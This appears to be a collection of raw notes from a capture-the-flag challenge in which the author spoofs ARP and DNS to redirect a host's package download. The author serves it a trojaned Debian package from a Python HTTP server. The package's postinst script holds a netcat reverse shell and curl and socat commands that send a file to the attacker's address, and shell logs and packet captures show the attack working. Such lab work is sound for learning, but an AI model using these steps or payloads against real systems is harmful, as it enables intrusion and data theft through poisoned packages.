                 96K gedit-common_3.36.1-1_all.deb                      264K nano_4.8-1ubuntu1_amd64.deb                    1.6M nmap_7.80+dfsg1-2build1_amd64.deb  4.0K temp
                 16K golang-github-huandu-xstrings-dev_1.2.1-1_all.deb   64K netcat-traditional_1.10-41.1ubuntu1_amd64.deb  316K socat_1.7.3.3-2_amd64.deb          168K unzip_6.0-25ubuntu1_amd64.deb
                guest@10bd7aa40918:~/debs$ dpkg-deb -R golang-github-huandu-xstrings-dev_1.2.1-1_all.deb temp/
                guest@10bd7aa40918:~/debs$ ls temp/
                DEBIAN  usr
                guest@10bd7aa40918:~/debs$ mkdir 1
                guest@10bd7aa40918:~/debs$ mkdir 2
                guest@10bd7aa40918:~/debs$ mkdir 3
                guest@10bd7aa40918:~/debs$ mkdir 4
                

                mkdir tmp
                dpkg-deb -R original.deb tmp
                
                # edit DEBIAN/postinst

                dpkg-deb -b tmp fixed.deb
                          

            ".Blog(_logger, "Working with debs ");



            @"
                    #!/usr/bin/python3
                    from http.server import HTTPServer, BaseHTTPRequestHandler
                    class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                        def do_GET(self):
                            self.send_response(200)
                            self.end_headers()
                            self.wfile.write(b'Hello, world!')
                    httpd = HTTPServer(('', 80), SimpleHTTPRequestHandler)
                    httpd.serve_forever()


                    https://blog.anvileight.com/posts/simple-python-http-server/
                    https://stackabuse.com/serving-files-with-pythons-simplehttpserver-module/
            ".Blog(_logger, "Create simple python HTTP server... ");



            @"
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=15775 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=15775
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=57281 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=57281
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=13659 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=13659
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=21458 UDP.dport=domain                                  
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=21458
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=12950 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=12950
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=5401 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=5401
                ^Cguest@10bd7aa40918:~$                                                                                                                     │
                ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
                /pub/jfrost/backdoor/suriv_amd64.deb
                10.6.6.35 - - [30/Dec/2020 21:06:05] code 404, message File not found
                10.6.6.35 - - [30/Dec/2020 21:06:05] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 404 -
                guest@10bd7aa40918:~/debs$ nano w.py 
                guest@10bd7aa40918:~/debs$ ./w.py 
                127.0.0.1 - - [30/Dec/2020 21:10:45] ""GET / HTTP/1.1"" 200 -
                10.6.6.35 - - [30/Dec/2020 21:11:14] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
                10.6.6.35 - - [30/Dec/2020 21:11:15] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
                10.6.6.35 - - [30/Dec/2020 21:11:16] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
                10.6.6.35 - - [30/Dec/2020 21:11:17] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
                10.6.6.35 - - [30/Dec/2020 21:11:18] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
                10.6.6.35 - - [30/Dec/2020 21:11:19] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
                10.6.6.35 - - [30/Dec/2020 21:11:20] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
                10.6.6.35 - - [30/Dec/2020 21:11:22] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
                10.6.6.35 - - [30/Dec/2020 21:11:23] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
            ".Blog(_logger, "Use {script} to send mr JF a nice surprice... ", "web_01.py");



            @"
                let's add this to deb package so the host will send us the text

                curl 10.6.0.3:80/helloworld
                curl 10.6.0.3:80 --data-binary '@/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt'

            ".Blog(_logger, "Once I figure out what is wrong with DNS. It stopped working :(");


            @"

















                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@7359217127bd:~$ ./d.py 
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=14641 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=14641
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │guest@7359217127bd:~$ ./d.py 
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=57018 UDP.dport=domain
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=57018
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@7359217127bd:~$ ./d.py 
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=11997 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=11997
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │guest@7359217127bd:~$ ./d.py 
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=28779 UDP.dport=domain
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=28779
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@7359217127bd:~$ ./d.py 
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=20591 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=20591
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │guest@7359217127bd:~$ ./d.py 
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=1115 UDP.dport=domain
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=1115
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@7359217127bd:~$ ./d.py 
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=25292 UDP.dport=domain
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=25292
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │guest@7359217127bd:~$ ./d.py 
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=62959 UDP.dport=domain
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=62959
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@7359217127bd:~$ ./d.py 
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │
                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │
                                                                                                                                                            │
                ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
                  138 32.347994655 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
                  139 32.364439143    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
                  140 33.363977127 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                  141 33.387950848 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
                  142 33.404427518    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
                  143 34.403985552 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                  144 34.427945401 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
                  145 34.444458999    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
                  146 35.448045967 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                  147 35.479992572 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
                  148 35.504382190    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
                  149 36.504138075 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                  150 36.536124703 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
                  151 36.568773276    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
                  152 37.563968557 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                  153 37.587932354 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
                  154 37.604424619    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
                  155 38.611986196 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                  156 38.636061736 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
                  157 38.660322843    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
                157 packets captured
                guest@7359217127bd:~$ nano w.py
                guest@7359217127bd:~$ chmod +x w.py 
                guest@7359217127bd:~$ ./w.py 
                10.6.6.35 - - [30/Dec/2020 23:08:07] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
                10.6.6.35 - - [30/Dec/2020 23:08:16] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
                10.6.6.35 - - [30/Dec/2020 23:08:22] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -


            ".Blog(_logger, "It is important to send only one DNS reply. This will trigger HTTP GET request where we will give back the surprice deb.");


            @"  
                cd debs
                rm golang-github-huandu-xstrings-dev_1.2.1-1_all.deb
                mkdir temp
                dpkg-deb -R nano_4.8-1ubuntu1_amd64.deb temp
                nano temp/DEBIAN/postinst
                nano temp/DEBIAN/prerm
                dpkg-deb -b temp golang-github-huandu-xstrings-dev_1.2.1-1_all.deb
                cd ..


            ".Blog(_logger, "Repack deb file");


            @"  
                guest@a20adb74486a:~/debs/netcat$ ls -R 
                .:
                bin  usr
                ./bin:
                nc.traditional
                ./usr:
                share
                ./usr/share:
                doc  man
                ./usr/share/doc:
                netcat-traditional
                ./usr/share/doc/netcat-traditional:
                README.Debian  README.gz  changelog.Debian.gz  copyright  examples
                ./usr/share/doc/netcat-traditional/examples:
                contrib  data  scripts
                ./usr/share/doc/netcat-traditional/examples/contrib:
                ncmeter
                ./usr/share/doc/netcat-traditional/examples/data:
                Makefile  README  data.c  dns-any.d  nfs-0.d  pm.d  pmap-dump.d  pmap-mnt.d  rip.d  rservice.c  showmount.d  xor.c
                ./usr/share/doc/netcat-traditional/examples/scripts:
                README  alta  bsh  dist.sh  irc  iscan  ncp  probe  web  webproxy  webrelay  websearch
                ./usr/share/man:
                man1
                ./usr/share/man/man1:
                nc.traditional.1.gz


                guest@a20adb74486a:~/debs/netcat$ ls -R -sh
                .:
                total 8.0K
                4.0K bin  4.0K usr
                ./bin:
                total 36K
                36K nc.traditional
                ./usr:
                total 4.0K
                4.0K share
                ./usr/share:
                total 8.0K
                4.0K doc  4.0K man
                ./usr/share/doc:
                total 4.0K
                4.0K netcat-traditional
                ./usr/share/doc/netcat-traditional:
                total 40K
                4.0K README.Debian   24K README.gz  4.0K changelog.Debian.gz  4.0K copyright  4.0K examples
                ./usr/share/doc/netcat-traditional/examples:
                total 12K
                4.0K contrib  4.0K data  4.0K scripts
                ./usr/share/doc/netcat-traditional/examples/contrib:
                total 4.0K
                4.0K ncmeter
                ./usr/share/doc/netcat-traditional/examples/data:
                total 52K
                4.0K Makefile  4.0K README  8.0K data.c  4.0K dns-any.d  4.0K nfs-0.d  4.0K pm.d  4.0K pmap-dump.d  4.0K pmap-mnt.d  4.0K rip.d  4.0K rservice.c  4.0K showmount.d  4.0K xor.c
                ./usr/share/doc/netcat-traditional/examples/scripts:
                total 56K
                4.0K README  4.0K alta  4.0K bsh  4.0K dist.sh  4.0K irc  4.0K iscan  4.0K ncp  4.0K probe  8.0K web  8.0K webproxy  4.0K webrelay  4.0K websearch
                ./usr/share/man:
                total 4.0K
                4.0K man1
                ./usr/share/man/man1:
                total 4.0K
                4.0K nc.traditional.1.gz
                guest@a20adb74486a:~/debs/netcat$ 

            ".Blog(_logger, "{x} content:", "netcat-traditional_1.10-41.1ubuntu1_amd64.deb");


            // nc -e /bin/sh 10.6.0.3 10001


            //guest@9cc3fc9e316e:~/debs$ cat 1/DEBIAN/postinst 
            //#!/bin/sh
            //set -e
            //if [ "$1" = "configure" ]; then
            //    update-alternatives \
            //        --install /bin/nc nc /bin/nc.traditional 10 \
            //        --slave /bin/netcat netcat /bin/nc.traditional \
            //        --slave /usr/share/man/man1/nc.1.gz nc.1.gz \
            //                /usr/share/man/man1/nc.traditional.1.gz \
            //        --slave /usr/share/man/man1/netcat.1.gz netcat.1.gz \
            //                /usr/share/man/man1/nc.traditional.1.gz
            //fi
            //guest@9cc3fc9e316e:~/debs$ nano 1/DEBIAN/postinst 
            //guest@9cc3fc9e316e:~/debs$ cat 1/DEBIAN/postinst 
            //#!/bin/sh
            //set -e
            //if [ "$1" = "configure" ]; then
            //    update-alternatives \
            //        --install /bin/nc nc /bin/nc.traditional 10 \
            //        --slave /bin/netcat netcat /bin/nc.traditional \
            //        --slave /usr/share/man/man1/nc.1.gz nc.1.gz \
            //                /usr/share/man/man1/nc.traditional.1.gz \
            //        --slave /usr/share/man/man1/netcat.1.gz netcat.1.gz \
            //                /usr/share/man/man1/nc.traditional.1.gz
            //fi
            //nc -e /bin/sh 10.6.0.3 10001
            //guest@9cc3fc9e316e:~/debs$ dpkg-deb -b 1 suriv_amd64.deb
            //dpkg-deb: building package 'netcat-traditional' in 'suriv_amd64.deb'.



            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=43385
            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@9cc3fc9e316e:~$ ./d.py 
            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=35729 UDP.dport=domain
            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=35729
            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │guest@9cc3fc9e316e:~$ ./d.py 
            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=48548 UDP.dport=domain
            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=48548
            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@9cc3fc9e316e:~$ ./d.py 
            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=3624 UDP.dport=domain
            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=3624
            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │guest@9cc3fc9e316e:~$ ./d.py
            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=64350 UDP.dport=domain
            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=64350
            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@9cc3fc9e316e:~$ ^C
            //^Cguest@9cc3fc9e316e:~$                                                                                                                     │guest@9cc3fc9e316e:~$ 
            //────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
            //set -e
            //if [ "$1" = "configure" ]; then
            //    update-alternatives \
            //        --install /bin/nc nc /bin/nc.traditional 10 \
            //        --slave /bin/netcat netcat /bin/nc.traditional \
            //        --slave /usr/share/man/man1/nc.1.gz nc.1.gz \
            //                /usr/share/man/man1/nc.traditional.1.gz \
            //        --slave /usr/share/man/man1/netcat.1.gz netcat.1.gz \
            //                /usr/share/man/man1/nc.traditional.1.gz
            //fi
            //nc -e /bin/sh 10.6.0.3 10001
            //guest@9cc3fc9e316e:~/debs$ dpkg-deb -b 1 suriv_amd64.deb
            //dpkg-deb: building package 'netcat-traditional' in 'suriv_amd64.deb'.
            //guest@9cc3fc9e316e:~/debs$ nc -lv 0.0.0.0 -p 10001
            //0.0.0.0: inverse host lookup failed: Host name lookup failure
            //listening on [any] 10001 ...
            //invalid connection to [10.6.0.3] from arp_requester.guestnet0.kringlecastle.com [10.6.6.35] 47004
            //guest@9cc3fc9e316e:~/debs$ 
            //──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
            //guest@9cc3fc9e316e:~$ nano w.py]
            //guest@9cc3fc9e316e:~$ nano w.py
            //guest@9cc3fc9e316e:~$ chmod +x w.py
            //guest@9cc3fc9e316e:~$ ./w
            //-bash: ./w: No such file or directory
            //guest@9cc3fc9e316e:~$ ./w.py 
            //10.6.6.35 - - [31/Dec/2020 16:49:11] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 200 -



            //────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
            //guest@9cc3fc9e316e:~/debs$ socat -u TCP-LISTEN:9876,reuseaddr OPEN:out.txt,creat && cat out.txt
            //Jack Frost has hijacked the host at 10.6.6.35 with some custom malware.
            //Help the North Pole by getting command line access back to this host.
            //Read the HELP.md file for information to help you in this endeavor.
            //Note: The terminal lifetime expires after 30 or more minutes so be 
            //sure to copy off any essential work you have done as you go.
            //guest@9cc3fc9e316e:~/debs$ 
            //──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
            //guest@9cc3fc9e316e:~$ socat -u FILE:motd TCP:127.0.0.1:9876
            //guest@9cc3fc9e316e:~$ 



            //guest@9cc3fc9e316e:~$ ls debs/s/DEBIAN/
            //control  md5sums
            //guest@9cc3fc9e316e:~$ nano debs/s/DEBIAN/postinst
            //guest@9cc3fc9e316e:~$ cat debs/s/DEBIAN/postinst 
            //#!/bin/sh
            //socat -u FILE:/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt TCP:10.6.0.3:10001
            //guest@9cc3fc9e316e:~$ chmod +x debs/s/DEBIAN/postinst 
